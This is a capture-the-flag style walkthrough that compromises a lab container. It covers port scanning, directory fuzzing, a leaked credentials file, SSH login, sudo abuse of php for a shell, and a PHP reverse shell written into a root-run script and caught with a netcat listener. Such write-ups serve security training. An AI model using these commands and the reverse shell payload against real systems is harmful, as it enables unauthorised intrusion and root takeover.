# IP
172.17.0.2
# Reconnaissance
```sh
ping -c 2 172.17.0.2
```

```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.044 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1008ms
rtt min/avg/max/mdev = 0.044/0.056/0.068/0.012 ms
```
# Ports scanning
```sh
sudo nmap -sS -sV -sC -p- 172.17.0.2
```

``` sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fb:64:7a:a5:1f:d3:f2:73:9c:8d:54:8b:65:67:3b:11 (RSA)
|   256 47:e1:c1:f2:de:f5:80:0e:10:96:04:95:c2:80:8b:76 (ECDSA)
|_  256 b1:c6:a8:5e:40:e0:ef:92:b2:e8:6f:f3:ad:9e:41:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mi Landing Page - Ciberseguridad
```
# Dir Fuzzing
```sh
dirb http://172.17.0.2 /usr/share/wordlists/dirb/common.txt
```

```sh
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Mon Sep 14 20:32:01 2026
URL_BASE: http://172.17.0.2/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://172.17.0.2/ ----
+ http://172.17.0.2/index.html (CODE:200|SIZE:9487)
+ http://172.17.0.2/server-status (CODE:403|SIZE:275)

-----------------
END_TIME: Mon Sep 14 20:32:01 2026
DOWNLOADED: 4612 - FOUND: 2
```
# Data Leak
```sh
curl -s http://172.17.0.2/.env_de_baluchingon
RECOVERY LOGIN

balu:balubalulerobalulei
```
# SSH login
```sh
ssh balu@172.17.0.2
password: balubalulerobalulei
```
# Privilege Escalation
```sh
sudo -l
User balu may run the following commands on c1ce2a2b4849:
    (chocolate) NOPASSWD: /usr/bin/php
```

```sh
balu@c1ce2a2b4849:/home$ sudo -u chocolate /usr/bin/php -r 'system("/bin/sh -i");'
$ whoami
chocolate
```

``` sh
find / -group chocolate 2>/dev/null

/home/chocolate
/home/chocolate/.profile
/home/chocolate/.bashrc
/home/chocolate/.bash_logout
/home/chocolate/.python_history
/opt/script.php
```

```sh
ps aux
root        1481  0.0  0.5  67032 20648 ?        S    00:21   0:00 php /opt/script.php
```

```sh
echo '<?php $sock=fsockopen("172.17.0.1",443);exec("/bin/sh -i <&3 >&3 2>&3"); ?>' > /opt/script.php
```

``` sh
sudo nc -lvnp 443
```

```sh
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 42678
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```